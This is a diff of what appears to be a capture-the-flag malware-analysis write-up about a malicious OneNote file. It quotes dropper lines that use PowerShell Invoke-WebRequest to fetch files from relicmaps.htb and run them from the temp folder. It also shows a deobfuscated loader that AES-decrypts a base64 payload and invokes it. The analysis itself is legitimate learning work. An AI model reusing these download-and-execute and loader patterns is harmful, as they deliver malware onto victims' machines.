@@ -24,10 +24,10 @@ Download relicmaps.one
 I don't have OneNote installed so just ran `strings` on it and found this interesting piece (VBScript in HTML - I guess it was supposed to run when you view the file?):
 
 ```powershell
-<snip>
+<#snip#>
 ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
 ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
-<snip>
+<#snip#>
 ```
 
 Download both files. Spent some time investigating topsecret-maps.one contents, extracted PNG with a map - but it turned out to be a red herring.
@@ -40,7 +40,7 @@ Either use search & replace (manual, long process) or script it to deobfuscate t
 This should produce the following result (some variables renamed for clarity):
 
 ```powershell
-$Base64Str = "SEWD/RSJz4q <snip> ="
+$Base64Str = "SEWD/RSJz4q <#snip#> ="
 
 $BinaryStream = [System.Convert]::FromBase64String($Base64Str);
 $AESDecryptor = New-Object System.Security.Cryptography.AesManaged;
@@ -69,7 +69,7 @@ $PtfdQ.Invoke($null, (, [string[]] ('%*')))%
 Then I modified unobfuscated PowerShell script to dump decrypted buffer contents to a file instead of running it:
 
 ```powershell
-<snip>
+<#snip#>
 $DecryptedBinaryStream = $bTMLk.ToArray();
 Set-Content -Path output.file -AsByteStream -Value $EncryptedBinaryStream
 ```
